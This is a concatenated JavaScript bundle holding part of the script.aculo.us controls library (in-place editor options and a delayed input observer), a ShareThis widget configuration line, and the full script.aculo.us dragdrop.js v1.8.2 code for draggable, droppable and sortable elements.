  showLoadingText: function(text) {
    this._controls.editor.disabled = true;
    var tempOption = this._controls.editor.firstChild;
    if (!tempOption) {
      tempOption = document.createElement('option');
      tempOption.value = '';
      this._controls.editor.appendChild(tempOption);
      tempOption.selected = true;
    }
    tempOption.update((text || '').stripScripts().stripTags());
  },

  checkForExternalText: function() {
    this._text = this.getText();
    if (this.options.loadTextURL)
      this.loadExternalText();
    else
      this.buildOptionList();
  },

  loadExternalText: function() {
    this.showLoadingText(this.options.loadingText);
    var options = Object.extend({ method: 'get' }, this.options.ajaxOptions);
    Object.extend(options, {
      parameters: 'editorId=' + encodeURIComponent(this.element.id),
      onComplete: Prototype.emptyFunction,
      onSuccess: function(transport) {
        this._text = transport.responseText.strip();
        this.buildOptionList();
      }.bind(this),
      onFailure: this.onFailure
    });
    new Ajax.Request(this.options.loadTextURL, options);
  },

  buildOptionList: function() {
    this._form.removeClassName(this.options.loadingClassName);
    this._collection = this._collection.map(function(entry) {
      return 2 === entry.length ? entry : [entry, entry].flatten();
    });
    var marker = ('value' in this.options) ? this.options.value : this._text;
    var textFound = this._collection.any(function(entry) {
      return entry[0] == marker;
    }.bind(this));
    this._controls.editor.update('');
    var option;
    this._collection.each(function(entry, index) {
      option = document.createElement('option');
      option.value = entry[0];
      option.selected = textFound ? entry[0] == marker : 0 == index;
      option.appendChild(document.createTextNode(entry[1]));
      this._controls.editor.appendChild(option);
    }.bind(this));
    this._controls.editor.disabled = false;
    Field.scrollFreeActivate(this._controls.editor);
  }
});

//**** DEPRECATION LAYER FOR InPlace[Collection]Editor! ****
//**** This only  exists for a while,  in order to  let ****
//**** users adapt to  the new API.  Read up on the new ****
//**** API and convert your code to it ASAP!            ****

Ajax.InPlaceEditor.prototype.initialize.dealWithDeprecatedOptions = function(options) {
  if (!options) return;
  function fallback(name, expr) {
    if (name in options || expr === undefined) return;
    options[name] = expr;
  };
  fallback('cancelControl', (options.cancelLink ? 'link' : (options.cancelButton ? 'button' :
    options.cancelLink == options.cancelButton == false ? false : undefined)));
  fallback('okControl', (options.okLink ? 'link' : (options.okButton ? 'button' :
    options.okLink == options.okButton == false ? false : undefined)));
  fallback('highlightColor', options.highlightcolor);
  fallback('highlightEndColor', options.highlightendcolor);
};

Object.extend(Ajax.InPlaceEditor, {
  DefaultOptions: {
    ajaxOptions: { },
    autoRows: 3,                                // Use when multi-line w/ rows == 1
    cancelControl: 'link',                      // 'link'|'button'|false
    cancelText: 'cancel',
    clickToEditText: 'Click to edit',
    externalControl: null,                      // id|elt
    externalControlOnly: false,
    fieldPostCreation: 'activate',              // 'activate'|'focus'|false
    formClassName: 'inplaceeditor-form',
    formId: null,                               // id|elt
    highlightColor: '#ffff99',
    highlightEndColor: '#ffffff',
    hoverClassName: '',
    htmlResponse: true,
    loadingClassName: 'inplaceeditor-loading',
    loadingText: 'Loading...',
    okControl: 'button',                        // 'link'|'button'|false
    okText: 'ok',
    paramName: 'value',
    rows: 1,                                    // If 1 and multi-line, uses autoRows
    savingClassName: 'inplaceeditor-saving',
    savingText: 'Saving...',
    size: 0,
    stripLoadedTextTags: false,
    submitOnBlur: false,
    textAfterControls: '',
    textBeforeControls: '',
    textBetweenControls: ''
  },
  DefaultCallbacks: {
    callback: function(form) {
      return Form.serialize(form);
    },
    onComplete: function(transport, element) {
      // For backward compatibility, this one is bound to the IPE, and passes
      // the element directly.  It was too often customized, so we don't break it.
      new Effect.Highlight(element, {
        startcolor: this.options.highlightColor, keepBackgroundImage: true });
    },
    onEnterEditMode: null,
    onEnterHover: function(ipe) {
      ipe.element.style.backgroundColor = ipe.options.highlightColor;
      if (ipe._effect)
        ipe._effect.cancel();
    },
    onFailure: function(transport, ipe) {
      alert('Error communication with the server: ' + transport.responseText.stripTags());
    },
    onFormCustomization: null, // Takes the IPE and its generated form, after editor, before controls.
    onLeaveEditMode: null,
    onLeaveHover: function(ipe) {
      ipe._effect = new Effect.Highlight(ipe.element, {
        startcolor: ipe.options.highlightColor, endcolor: ipe.options.highlightEndColor,
        restorecolor: ipe._originalBackground, keepBackgroundImage: true
      });
    }
  },
  Listeners: {
    click: 'enterEditMode',
    keydown: 'checkForEscapeOrReturn',
    mouseover: 'enterHover',
    mouseout: 'leaveHover'
  }
});

Ajax.InPlaceCollectionEditor.DefaultOptions = {
  loadingCollectionText: 'Loading options...'
};

// Delayed observer, like Form.Element.Observer,
// but waits for delay after last key input
// Ideal for live-search fields

Form.Element.DelayedObserver = Class.create({
  initialize: function(element, delay, callback) {
    this.delay     = delay || 0.5;
    this.element   = $(element);
    this.callback  = callback;
    this.timer     = null;
    this.lastValue = $F(this.element);
    Event.observe(this.element,'keyup',this.delayedListener.bindAsEventListener(this));
  },
  delayedListener: function(event) {
    if(this.lastValue == $F(this.element)) return;
    if(this.timer) clearTimeout(this.timer);
    this.timer = setTimeout(this.onTimerEvent.bind(this), this.delay * 1000);
    this.lastValue = $F(this.element);
  },
  onTimerEvent: function() {
    this.timer = null;
    this.callback(this.element, $F(this.element));
  }
});
stLight.options({publisher:'4210e825-9cb0-42f3-8bad-6125b3aa70fe'});
// script.aculo.us dragdrop.js v1.8.2, Tue Nov 18 18:30:58 +0100 2008

// Copyright (c) 2005-2008 Thomas Fuchs (http://script.aculo.us, http://mir.aculo.us)
//           (c) 2005-2008 Sammi Williams (http://www.oriontransfer.co.nz, sammi@oriontransfer.co.nz)
//
// script.aculo.us is freely distributable under the terms of an MIT-style license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

if(Object.isUndefined(Effect))
  throw("dragdrop.js requires including script.aculo.us' effects.js library");

var Droppables = {
  drops: [],

  remove: function(element) {
    this.drops = this.drops.reject(function(d) { return d.element==$(element) });
  },

  add: function(element) {
    element = $(element);
    var options = Object.extend({
      greedy:     true,
      hoverclass: null,
      tree:       false
    }, arguments[1] || { });

    // cache containers
    if(options.containment) {
      options._containers = [];
      var containment = options.containment;
      if(Object.isArray(containment)) {
        containment.each( function(c) { options._containers.push($(c)) });
      } else {
        options._containers.push($(containment));
      }
    }

    if(options.accept) options.accept = [options.accept].flatten();

    Element.makePositioned(element); // fix IE
    options.element = element;

    this.drops.push(options);
  },

  findDeepestChild: function(drops) {
    deepest = drops[0];

    for (i = 1; i < drops.length; ++i)
      if (Element.isParent(drops[i].element, deepest.element))
        deepest = drops[i];

    return deepest;
  },

  isContained: function(element, drop) {
    var containmentNode;
    if(drop.tree) {
      containmentNode = element.treeNode;
    } else {
      containmentNode = element.parentNode;
    }
    return drop._containers.detect(function(c) { return containmentNode == c });
  },

  isAffected: function(point, element, drop) {
    return (
      (drop.element!=element) &&
      ((!drop._containers) ||
        this.isContained(element, drop)) &&
      ((!drop.accept) ||
        (Element.classNames(element).detect(
          function(v) { return drop.accept.include(v) } ) )) &&
      Position.within(drop.element, point[0], point[1]) );
  },

  deactivate: function(drop) {
    if(drop.hoverclass)
      Element.removeClassName(drop.element, drop.hoverclass);
    this.last_active = null;
  },

  activate: function(drop) {
    if(drop.hoverclass)
      Element.addClassName(drop.element, drop.hoverclass);
    this.last_active = drop;
  },

  show: function(point, element) {
    if(!this.drops.length) return;
    var drop, affected = [];

    this.drops.each( function(drop) {
      if(Droppables.isAffected(point, element, drop))
        affected.push(drop);
    });

    if(affected.length>0)
      drop = Droppables.findDeepestChild(affected);

    if(this.last_active && this.last_active != drop) this.deactivate(this.last_active);
    if (drop) {
      Position.within(drop.element, point[0], point[1]);
      if(drop.onHover)
        drop.onHover(element, drop.element, Position.overlap(drop.overlap, drop.element));

      if (drop != this.last_active) Droppables.activate(drop);
    }
  },

  fire: function(event, element) {
    if(!this.last_active) return;
    Position.prepare();

    if (this.isAffected([Event.pointerX(event), Event.pointerY(event)], element, this.last_active))
      if (this.last_active.onDrop) {
        this.last_active.onDrop(element, this.last_active.element, event);
        return true;
      }
  },

  reset: function() {
    if(this.last_active)
      this.deactivate(this.last_active);
  }
};

var Draggables = {
  drags: [],
  observers: [],

  register: function(draggable) {
    if(this.drags.length == 0) {
      this.eventMouseUp   = this.endDrag.bindAsEventListener(this);
      this.eventMouseMove = this.updateDrag.bindAsEventListener(this);
      this.eventKeypress  = this.keyPress.bindAsEventListener(this);

      Event.observe(document, "mouseup", this.eventMouseUp);
      Event.observe(draggable.element, "mousemove", this.eventMouseMove);
      Event.observe(document, "keypress", this.eventKeypress);
    }
    this.drags.push(draggable);
  },

  unregister: function(draggable) {
    this.drags = this.drags.reject(function(d) { return d==draggable });
    if(this.drags.length == 0) {
      Event.stopObserving(document, "mouseup", this.eventMouseUp);
      Event.stopObserving(draggable.element, "mousemove", this.eventMouseMove);
      Event.stopObserving(document, "keypress", this.eventKeypress);
    }
  },

  activate: function(draggable) {
    if(draggable.options.delay) {
      this._timeout = setTimeout(function() {
        Draggables._timeout = null;
        window.focus();
        Draggables.activeDraggable = draggable;
      }.bind(this), draggable.options.delay);
    } else {
      window.focus(); // allows keypress events if window isn't currently focused, fails for Safari
      this.activeDraggable = draggable;
    }
  },

  deactivate: function() {
    this.activeDraggable = null;
  },

  updateDrag: function(event) {
    if(!this.activeDraggable) return;
    var pointer = [Event.pointerX(event), Event.pointerY(event)];
    // Mozilla-based browsers fire successive mousemove events with
    // the same coordinates, prevent needless redrawing (moz bug?)
    if(this._lastPointer && (this._lastPointer.inspect() == pointer.inspect())) return;
    this._lastPointer = pointer;

    this.activeDraggable.updateDrag(event, pointer);
  },

  endDrag: function(event) {
    if(this._timeout) {
      clearTimeout(this._timeout);
      this._timeout = null;
    }
    if(!this.activeDraggable) return;
    this._lastPointer = null;
    this.activeDraggable.endDrag(event);
    this.activeDraggable = null;
  },

  keyPress: function(event) {
    if(this.activeDraggable)
      this.activeDraggable.keyPress(event);
  },

  addObserver: function(observer) {
    this.observers.push(observer);
    this._cacheObserverCallbacks();
  },

  removeObserver: function(element) {  // element instead of observer fixes mem leaks
    this.observers = this.observers.reject( function(o) { return o.element==element });
    this._cacheObserverCallbacks();
  },

  notify: function(eventName, draggable, event) {  // 'onStart', 'onEnd', 'onDrag'
    if(this[eventName+'Count'] > 0)
      this.observers.each( function(o) {
        if(o[eventName]) o[eventName](eventName, draggable, event);
      });
    if(draggable.options[eventName]) draggable.options[eventName](draggable, event);
  },

  _cacheObserverCallbacks: function() {
    ['onStart','onEnd','onDrag'].each( function(eventName) {
      Draggables[eventName+'Count'] = Draggables.observers.select(
        function(o) { return o[eventName]; }
      ).length;
    });
  }
};

/*--------------------------------------------------------------------------*/

var Draggable = Class.create({
  initialize: function(element) {
    var defaults = {
      handle: false,
      reverteffect: function(element, top_offset, left_offset) {
        var dur = Math.sqrt(Math.abs(top_offset^2)+Math.abs(left_offset^2))*0.02;
        new Effect.Move(element, { x: -left_offset, y: -top_offset, duration: dur,
          queue: {scope:'_draggable', position:'end'}
        });
      },
      endeffect: function(element) {
        var toOpacity = Object.isNumber(element._opacity) ? element._opacity : 1.0;
        new Effect.Opacity(element, {duration:0.2, from:0.7, to:toOpacity,
          queue: {scope:'_draggable', position:'end'},
          afterFinish: function(){
            Draggable._dragging[element] = false
          }
        });
      },
      zindex: 1000,
      revert: false,
      quiet: false,
      scroll: false,
      scrollSensitivity: 20,
      scrollSpeed: 15,
      snap: false,  // false, or xy or [x,y] or function(x,y){ return [x,y] }
      delay: 0
    };

    if(!arguments[1] || Object.isUndefined(arguments[1].endeffect))
      Object.extend(defaults, {
        starteffect: function(element) {
          element._opacity = Element.getOpacity(element);
          Draggable._dragging[element] = true;
          new Effect.Opacity(element, {duration:0.2, from:element._opacity, to:0.7});
        }
      });

    var options = Object.extend(defaults, arguments[1] || { });

    this.element = $(element);

    if(options.handle && Object.isString(options.handle))
      this.handle = this.element.down('.'+options.handle, 0);

    if(!this.handle) this.handle = $(options.handle);
    if(!this.handle) this.handle = this.element;

    if(options.scroll && !options.scroll.scrollTo && !options.scroll.outerHTML) {
      options.scroll = $(options.scroll);
      this._isScrollChild = Element.childOf(this.element, options.scroll);
    }

    Element.makePositioned(this.element); // fix IE

    this.options  = options;
    this.dragging = false;

    this.eventMouseDown = this.initDrag.bindAsEventListener(this);
    Event.observe(this.handle, "mousedown", this.eventMouseDown);

    Draggables.register(this);
  },

  destroy: function() {
    Event.stopObserving(this.handle, "mousedown", this.eventMouseDown);
    Draggables.unregister(this);
  },

  currentDelta: function() {
    return([
      parseInt(Element.getStyle(this.element,'left') || '0'),
      parseInt(Element.getStyle(this.element,'top') || '0')]);
  },

  initDrag: function(event) {
    if(!Object.isUndefined(Draggable._dragging[this.element]) &&
      Draggable._dragging[this.element]) return;
    if(Event.isLeftClick(event)) {
      // abort on form elements, fixes a Firefox issue
      var src = Event.element(event);
      if((tag_name = src.tagName.toUpperCase()) && (
        tag_name=='INPUT' ||
        tag_name=='SELECT' ||
        tag_name=='OPTION' ||
        tag_name=='BUTTON' ||
        tag_name=='TEXTAREA')) return;

      var pointer = [Event.pointerX(event), Event.pointerY(event)];
      var pos     = Position.cumulativeOffset(this.element);
      this.offset = [0,1].map( function(i) { return (pointer[i] - pos[i]) });

      Draggables.activate(this);
      Event.stop(event);
    }
  },

  startDrag: function(event) {
    this.dragging = true;
    if(!this.delta)
      this.delta = this.currentDelta();

    if(this.options.zindex) {
      this.originalZ = parseInt(Element.getStyle(this.element,'z-index') || 0);
      this.element.style.zIndex = this.options.zindex;
    }

    if(this.options.ghosting) {
      this._clone = this.element.cloneNode(true);
      this._originallyAbsolute = (this.element.getStyle('position') == 'absolute');
      if (!this._originallyAbsolute)
        Position.absolutize(this.element);
      this.element.parentNode.insertBefore(this._clone, this.element);
    }

    if(this.options.scroll) {
      if (this.options.scroll == window) {
        var where = this._getWindowScroll(this.options.scroll);
        this.originalScrollLeft = where.left;
        this.originalScrollTop = where.top;
      } else {
        this.originalScrollLeft = this.options.scroll.scrollLeft;
        this.originalScrollTop = this.options.scroll.scrollTop;
      }
    }

    Draggables.notify('onStart', this, event);

    if(this.options.starteffect) this.options.starteffect(this.element);
  },

  updateDrag: function(event, pointer) {
    if(!this.dragging) this.startDrag(event);

    if(!this.options.quiet){
      Position.prepare();
      Droppables.show(pointer, this.element);
    }

    Draggables.notify('onDrag', this, event);

    this.draw(pointer);
    if(this.options.change) this.options.change(this);

    if(this.options.scroll) {
      this.stopScrolling();

      var p;
      if (this.options.scroll == window) {
        with(this._getWindowScroll(this.options.scroll)) { p = [ left, top, left+width, top+height ]; }
      } else {
        p = Position.page(this.options.scroll);
        p[0] += this.options.scroll.scrollLeft + Position.deltaX;
        p[1] += this.options.scroll.scrollTop + Position.deltaY;
        p.push(p[0]+this.options.scroll.offsetWidth);
        p.push(p[1]+this.options.scroll.offsetHeight);
      }
      var speed = [0,0];
      if(pointer[0] < (p[0]+this.options.scrollSensitivity)) speed[0] = pointer[0]-(p[0]+this.options.scrollSensitivity);
      if(pointer[1] < (p[1]+this.options.scrollSensitivity)) speed[1] = pointer[1]-(p[1]+this.options.scrollSensitivity);
      if(pointer[0] > (p[2]-this.options.scrollSensitivity)) speed[0] = pointer[0]-(p[2]-this.options.scrollSensitivity);
      if(pointer[1] > (p[3]-this.options.scrollSensitivity)) speed[1] = pointer[1]-(p[3]-this.options.scrollSensitivity);
      this.startScrolling(speed);
    }

    // fix AppleWebKit rendering
    if(Prototype.Browser.WebKit) window.scrollBy(0,0);

    Event.stop(event);
  },

  finishDrag: function(event, success) {
    this.dragging = false;

    if(this.options.quiet){
      Position.prepare();
      var pointer = [Event.pointerX(event), Event.pointerY(event)];
      Droppables.show(pointer, this.element);
    }

    if(this.options.ghosting) {
      if (!this._originallyAbsolute)
        Position.relativize(this.element);
      delete this._originallyAbsolute;
      Element.remove(this._clone);
      this._clone = null;
    }

    var dropped = false;
    if(success) {
      dropped = Droppables.fire(event, this.element);
      if (!dropped) dropped = false;
    }
    if(dropped && this.options.onDropped) this.options.onDropped(this.element);
    Draggables.notify('onEnd', this, event);

    var revert = this.options.revert;
    if(revert && Object.isFunction(revert)) revert = revert(this.element);

    var d = this.currentDelta();
    if(revert && this.options.reverteffect) {
      if (dropped == 0 || revert != 'failure')
        this.options.reverteffect(this.element,
          d[1]-this.delta[1], d[0]-this.delta[0]);
    } else {
      this.delta = d;
    }

    if(this.options.zindex)
      this.element.style.zIndex = this.originalZ;

    if(this.options.endeffect)
      this.options.endeffect(this.element);

    Draggables.deactivate(this);
    Droppables.reset();
  },

  keyPress: function(event) {
    if(event.keyCode!=Event.KEY_ESC) return;
    this.finishDrag(event, false);
    Event.stop(event);
  },

  endDrag: function(event) {
    if(!this.dragging) return;
    this.stopScrolling();
    this.finishDrag(event, true);
    Event.stop(event);
  },

  draw: function(point) {
    var pos = Position.cumulativeOffset(this.element);
    if(this.options.ghosting) {
      var r   = Position.realOffset(this.element);
      pos[0] += r[0] - Position.deltaX; pos[1] += r[1] - Position.deltaY;
    }

    var d = this.currentDelta();
    pos[0] -= d[0]; pos[1] -= d[1];

    if(this.options.scroll && (this.options.scroll != window && this._isScrollChild)) {
      pos[0] -= this.options.scroll.scrollLeft-this.originalScrollLeft;
      pos[1] -= this.options.scroll.scrollTop-this.originalScrollTop;
    }

    var p = [0,1].map(function(i){
      return (point[i]-pos[i]-this.offset[i])
    }.bind(this));

    if(this.options.snap) {
      if(Object.isFunction(this.options.snap)) {
        p = this.options.snap(p[0],p[1],this);
      } else {
      if(Object.isArray(this.options.snap)) {
        p = p.map( function(v, i) {
          return (v/this.options.snap[i]).round()*this.options.snap[i] }.bind(this));
      } else {
        p = p.map( function(v) {
          return (v/this.options.snap).round()*this.options.snap }.bind(this));
      }
    }}

    var style = this.element.style;
    if((!this.options.constraint) || (this.options.constraint=='horizontal'))
      style.left = p[0] + "px";
    if((!this.options.constraint) || (this.options.constraint=='vertical'))
      style.top  = p[1] + "px";

    if(style.visibility=="hidden") style.visibility = ""; // fix gecko rendering
  },

  stopScrolling: function() {
    if(this.scrollInterval) {
      clearInterval(this.scrollInterval);
      this.scrollInterval = null;
      Draggables._lastScrollPointer = null;
    }
  },

  startScrolling: function(speed) {
    if(!(speed[0] || speed[1])) return;
    this.scrollSpeed = [speed[0]*this.options.scrollSpeed,speed[1]*this.options.scrollSpeed];
    this.lastScrolled = new Date();
    this.scrollInterval = setInterval(this.scroll.bind(this), 10);
  },

  scroll: function() {
    var current = new Date();
    var delta = current - this.lastScrolled;
    this.lastScrolled = current;
    if(this.options.scroll == window) {
      with (this._getWindowScroll(this.options.scroll)) {
        if (this.scrollSpeed[0] || this.scrollSpeed[1]) {
          var d = delta / 1000;
          this.options.scroll.scrollTo( left + d*this.scrollSpeed[0], top + d*this.scrollSpeed[1] );
        }
      }
    } else {
      this.options.scroll.scrollLeft += this.scrollSpeed[0] * delta / 1000;
      this.options.scroll.scrollTop  += this.scrollSpeed[1] * delta / 1000;
    }

    Position.prepare();
    Droppables.show(Draggables._lastPointer, this.element);
    Draggables.notify('onDrag', this);
    if (this._isScrollChild) {
      Draggables._lastScrollPointer = Draggables._lastScrollPointer || $A(Draggables._lastPointer);
      Draggables._lastScrollPointer[0] += this.scrollSpeed[0] * delta / 1000;
      Draggables._lastScrollPointer[1] += this.scrollSpeed[1] * delta / 1000;
      if (Draggables._lastScrollPointer[0] < 0)
        Draggables._lastScrollPointer[0] = 0;
      if (Draggables._lastScrollPointer[1] < 0)
        Draggables._lastScrollPointer[1] = 0;
      this.draw(Draggables._lastScrollPointer);
    }

    if(this.options.change) this.options.change(this);
  },

  _getWindowScroll: function(w) {
    var T, L, W, H;
    with (w.document) {
      if (w.document.documentElement && documentElement.scrollTop) {
        T = documentElement.scrollTop;
        L = documentElement.scrollLeft;
      } else if (w.document.body) {
        T = body.scrollTop;
        L = body.scrollLeft;
      }
      if (w.innerWidth) {
        W = w.innerWidth;
        H = w.innerHeight;
      } else if (w.document.documentElement && documentElement.clientWidth) {
        W = documentElement.clientWidth;
        H = documentElement.clientHeight;
      } else {
        W = body.offsetWidth;
        H = body.offsetHeight;
      }
    }
    return { top: T, left: L, width: W, height: H };
  }
});

Draggable._dragging = { };

/*--------------------------------------------------------------------------*/

var SortableObserver = Class.create({
  initialize: function(element, observer) {
    this.element   = $(element);
    this.observer  = observer;
    this.lastValue = Sortable.serialize(this.element);
  },

  onStart: function() {
    this.lastValue = Sortable.serialize(this.element);
  },

  onEnd: function() {
    Sortable.unmark();
    if(this.lastValue != Sortable.serialize(this.element))
      this.observer(this.element)
  }
});

var Sortable = {
  SERIALIZE_RULE: /^[^_\-](?:[A-Za-z0-9\-\_]*)[_](.*)$/,

  sortables: { },

  _findRootElement: function(element) {
    while (element.tagName.toUpperCase() != "BODY") {
      if(element.id && Sortable.sortables[element.id]) return element;
      element = element.parentNode;
    }
  },

  options: function(element) {
    element = Sortable._findRootElement($(element));
    if(!element) return;
    return Sortable.sortables[element.id];
  },

  destroy: function(element){
    element = $(element);
    var s = Sortable.sortables[element.id];

    if(s) {
      Draggables.removeObserver(s.element);
      s.droppables.each(function(d){ Droppables.remove(d) });
      s.draggables.invoke('destroy');

      delete Sortable.sortables[s.element.id];
    }
  },

  create: function(element) {
    element = $(element);
    var options = Object.extend({
      element:     element,
      tag:         'li',       // assumes li children, override with tag: 'tagname'
      dropOnEmpty: false,
      tree:        false,
      treeTag:     'ul',
      overlap:     'vertical', // one of 'vertical', 'horizontal'
      constraint:  'vertical', // one of 'vertical', 'horizontal', false
      containment: element,    // also takes array of elements (or id's); or false
      handle:      false,      // or a CSS class
      only:        false,
      delay:       0,
      hoverclass:  null,
      ghosting:    false,
      quiet:       false,
      scroll:      false,
      scrollSensitivity: 20,
      scrollSpeed: 15,
      format:      this.SERIALIZE_RULE,

      // these take arrays of elements or ids and can be
      // used for better initialization performance
      elements:    false,
      handles:     false,

      onChange:    Prototype.emptyFunction,
      onUpdate:    Prototype.emptyFunction
    }, arguments[1] || { });

    // clear any old sortable with same element
    this.destroy(element);

    // build options for the draggables
    var options_for_draggable = {
      revert:      true,
      quiet:       options.quiet,
      scroll:      options.scroll,
      scrollSpeed: options.scrollSpeed,
      scrollSensitivity: options.scrollSensitivity,
      delay:       options.delay,
      ghosting:    options.ghosting,
      constraint:  options.constraint,
      handle:      options.handle };

    if(options.starteffect)
      options_for_draggable.starteffect = options.starteffect;

    if(options.reverteffect)
      options_for_draggable.reverteffect = options.reverteffect;
    else
      if(options.ghosting) options_for_draggable.reverteffect = function(element) {
        element.style.top  = 0;
        element.style.left = 0;
      };

    if(options.endeffect)
      options_for_draggable.endeffect = options.endeffect;

    if(options.zindex)
      options_for_draggable.zindex = options.zindex;

    // build options for the droppables
    var options_for_droppable = {
      overlap:     options.overlap,
      containment: options.containment,
      tree:        options.tree,
      hoverclass:  options.hoverclass,
      onHover:     Sortable.onHover
    };

    var options_for_tree = {
      onHover:      Sortable.onEmptyHover,
      overlap:      options.overlap,
      containment:  options.containment,
      hoverclass:   options.hoverclass
    };

    // fix for gecko engine
    Element.cleanWhitespace(element);

    options.draggables = [];
    options.droppables = [];

    // drop on empty handling
    if(options.dropOnEmpty || options.tree) {
      Droppables.add(element, options_for_tree);
      options.droppables.push(element);
    }

    (options.elements || this.findElements(element, options) || []).each( function(e,i) {
      var handle = options.handles ? $(options.handles[i]) :
        (options.handle ? $(e).select('.' + options.handle)[0] : e);
      options.draggables.push(
        new Draggable(e, Object.extend(options_for_draggable, { handle: handle })));
      Droppables.add(e, options_for_droppable);
      if(options.tree) e.treeNode = element;
      options.droppables.push(e);
    });

    if(options.tree) {
      (Sortable.findTreeElements(element, options) || []).each( function(e) {
        Droppables.add(e, options_for_tree);
        e.treeNode = element;
        options.droppables.push(e);
      });
    }

    // keep reference
    this.sortables[element.id] = options;

    // for onupdate
    Draggables.addObserver(new SortableObserver(element, options.onUpdate));

  },

  // return all suitable-for-sortable elements in a guaranteed order
  findElements: function(element, options) {
    return Element.findChildren(
      element, options.only, options.tree ? true : false, options.tag);
  },

  findTreeElements: function(element, options) {
    return Element.findChildren(
      element, options.only, options.tree ? true : false, options.treeTag);
  },

  onHover: function(element, dropon, overlap) {
    if(Element.isParent(dropon, element)) return;

    if(overlap > .33 && overlap < .66 && Sortable.options(dropon).tree) {
      return;
    } else if(overlap>0.5) {
      Sortable.mark(dropon, 'before');
      if(dropon.previousSibling != element) {
        var oldParentNode = element.parentNode;
        element.style.visibility = "hidden"; // fix gecko rendering
        dropon.parentNode.insertBefore(element, dropon);
        if(dropon.parentNode!=oldParentNode)
          Sortable.options(oldParentNode).onChange(element);
        Sortable.options(dropon.parentNode).onChange(element);
      }
    } else {
      Sortable.mark(dropon, 'after');
      var nextElement = dropon.nextSibling || null;
      if(nextElement != element) {
        var oldParentNode = element.parentNode;
        element.style.visibility = "hidden"; // fix gecko rendering
        dropon.parentNode.insertBefore(element, nextElement);
        if(dropon.parentNode!=oldParentNode)
          Sortable.options(oldParentNode).onChange(element);
        Sortable.options(dropon.parentNode).onChange(element);
      }
    }
  },

  onEmptyHover: function(element, dropon, overlap) {
    var oldParentNode = element.parentNode;
    var droponOptions = Sortable.options(dropon);

    if(!Element.isParent(dropon, element)) {
      var index;

      var children = Sortable.findElements(dropon, {tag: droponOptions.tag, only: droponOptions.only});
      var child = null;

      if(children) {
        var offset = Element.offsetSize(dropon, droponOptions.overlap) * (1.0 - overlap);

        for (index = 0; index < children.length; index += 1) {
          if (offset - Element.offsetSize (children[index], droponOptions.overlap) >= 0) {
            offset -= Element.offsetSize (children[index], droponOptions.overlap);
          } else if (offset - (Element.offsetSize (children[index], droponOptions.overlap) / 2) >= 0) {
            child = index + 1 < children.length ? children[index + 1] : null;
            break;
          } else {
            child = children[index];
            break;
          }
        }
      }

      dropon.insertBefore(element, child);

      Sortable.options(oldParentNode).onChange(element);
      droponOptions.onChange(element);
    }
  },

  unmark: function() {
    if(Sortable._marker) Sortable._marker.hide();
  },

  mark: function(dropon, position) {
    // mark on ghosting only
    var sortable = Sortable.options(dropon.parentNode);
    if(sortable && !sortable.ghosting) return;

    if(!Sortable._marker) {
      Sortable._marker =
        ($('dropmarker') || Element.extend(document.createElement('DIV'))).
          hide().addClassName('dropmarker').setStyle({position:'absolute'});
      document.getElementsByTagName("body").item(0).appendChild(Sortable._marker);
    }
    var offsets = Position.cumulativeOffset(dropon);
    Sortable._marker.setStyle({left: offsets[0]+'px', top: offsets[1] + 'px'});

    if(position=='after')
      if(sortable.overlap == 'horizontal')
        Sortable._marker.setStyle({left: (offsets[0]+dropon.clientWidth) + 'px'});
      else
        Sortable._marker.setStyle({top: (offsets[1]+dropon.clientHeight) + 'px'});

    Sortable._marker.show();
  },

  _tree: function(element, options, parent) {
    var children = Sortable.findElements(element, options) || [];

    for (var i = 0; i < children.length; ++i) {
      var match = children[i].id.match(options.format);

      if (!match) continue;

      var child = {
        id: encodeURIComponent(match ? match[1] : null),
        element: element,
        parent: parent,
        children: [],
        position: parent.children.length,
        container: $(children[i]).down(options.treeTag)
      };

      /* Get the element containing the children and recurse over it */
      if (child.container)
        this._tree(child.container, options, child);

      parent.children.push (child);
    }

    return parent;
  },

  tree: function(element) {
    element = $(element);
    var sortableOptions = this.options(element);
    var options = Object.extend({
      tag: sortableOptions.tag,
      treeTag: sortableOptions.treeTag,
      only: sortableOptions.only,
      name: element.id,
      format: sortableOptions.format
    }, arguments[1] || { });

    var root = {
      id: null,
      parent: null,
      children: [],
      container: element,
      position: 0
    };

    return Sortable._tree(element, options, root);
  },

  /* Construct a [i] index for a particular node */
  _constructIndex: function(node) {
    var index = '';
    do {
      if (node.id) index = '[' + node.position + ']' + index;
    } while ((node = node.parent) != null);
    return index;
  },

  sequence: function(element) {
    element = $(element);
    var options = Object.extend(this.options(element), arguments[1] || { });

    return $(this.findElements(element, options) || []).map( function(item) {
      return item.id.match(options.format) ? item.id.match(options.format)[1] : '';
    });
  },

  setSequence: function(element, new_sequence) {
    element = $(element);
    var options = Object.extend(this.options(element), arguments[2] || { });

    var nodeMap = { };
    this.findElements(element, options).each( function(n) {
        if (n.id.match(options.format))
            nodeMap[n.id.match(options.format)[1]] = [n, n.parentNode];
        n.parentNode.removeChild(n);
    });

    new_sequence.each(function(ident) {
      var n = nodeMap[ident];
      if (n) {
        n[1].appendChild(n[0]);
        delete nodeMap[ident];
      }
    });
  },

  serialize: function(element) {
    element = $(element);
    var options = Object.extend(Sortable.options(element), arguments[1] || { });
    var name = encodeURIComponent(
      (arguments[1] && arguments[1].name) ? arguments[1].name : element.id);

    if (options.tree) {
      return Sortable.tree(element, arguments[1]).children.map( function (item) {
        return [name + Sortable._constructIndex(item) + "[id]=" +
                encodeURIComponent(item.id)].concat(item.children.map(arguments.callee));
      }).flatten().join('&');
    } else {
      return Sortable.sequence(element, arguments[1]).map( function(item) {
        return name + "[]=" + encodeURIComponent(item);
      }).join('&');
    }
  }
};

// Returns true if child is contained within element
Element.isParent = function(child, element) {
  if (!child.parentNode || child == element) return false;
  if (child.parentNode == element) return true;
  return Element.isParent(child.parentNode, element);
};

Element.findChildren = function(element, only, recursive, tagName) {
  if(!element.hasChildNodes()) return null;
  tagName = tagName.toUpperCase();
  if(only) only = [only].flatten();
  var elements = [];
  $A(element.childNodes).each( function(e) {
    if(e.tagName && e.tagName.toUpperCase()==tagName &&
      (!only || (Element.classNames(e).detect(function(v) { return only.include(v) }))))
        elements.push(e);
    if(recursive) {
      var grandchildren = Element.findChildren(e, only, recursive, tagName);
      if(grandchildren) elements.push(grandchildren);
    }
  });

  return (elements.length>0 ? elements.flatten() : []);
};

Element.offsetSize = function (element, type) {
  return element['offset' + ((type=='vertical' || type=='height') ? 'Height' : 'Width')];
};
